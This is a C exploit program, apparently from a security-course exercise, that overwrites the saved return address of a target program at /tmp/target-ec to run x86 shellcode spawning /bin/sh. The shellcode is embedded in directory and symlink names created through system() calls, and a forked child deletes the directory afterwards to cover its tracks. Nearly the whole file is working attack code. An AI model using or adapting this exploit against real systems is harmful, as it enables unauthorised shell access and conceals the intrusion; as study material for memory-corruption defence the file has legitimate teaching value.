#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include "shellcode.h"

#define TARGET "/tmp/target-ec"
#define WAIT_SECS 2


/* 
 * Main idea of exploit:
 *     This exploit takes advantage of symlinks and 
 *     the fact that elf loading loads the filename
 *     at the top of the stack. 
 *
 *     The basic idea for the exploit is create a 
 *     a symlink to the target whose name contains 
 *     the shellcode. execve will load the symlink 
 *     filename at the top of the stack when executing 
 *     it. We overwrite the saved eip for main with the 
 *     address of this symlink name.    
 */


/* creates a (poisonous) directory whose path is the shellcode */
static char mkdir_cmd[] =
  "mkdir -p \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

/* creates a symlink from dummy file inside directory to /tmp/target-ec */
static char ln_cmd[] =
  "ln -s /tmp/target-ec \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh/dummy";

/* removes poisonous directory */
static char rm_cmd[] =
  "rm -rf \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff";

static char symlinkname[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh/dummy";

int main(void)
{
  char *args[4];
  char *env[1];
  char *retLoc = "0xBFFFFE2C"; /* Address of main's saved eip in target-ec.c */
  char *retAddr = "0xBFFFFFC8"; /* Address of shellcode/symlinkname */
  
  system (mkdir_cmd); /* make a directory whose path is the shellcode */
  system (ln_cmd); /* create symlink to target-ec inside directory */

  pid_t pid = fork ();

  /* Child process will cover the tracks by cleaning up the
     poisonous directory after a couple of seconds. */
  if (pid == (pid_t)0)
  {
    sleep (WAIT_SECS); /* wait couple of secs for the exploit to work */
    system (rm_cmd);

    return 0;    
  }
  
  /* Parent process will execute the exploit */
  else
  {
    args[0] = TARGET; args[1] = retLoc; args[2] = retAddr; args[3] = NULL;
    env[0] = NULL;

    if (0 > execve (symlinkname, args, env))
      fprintf (stderr, "execve failed.\n");
    
    return 0;
  }
}
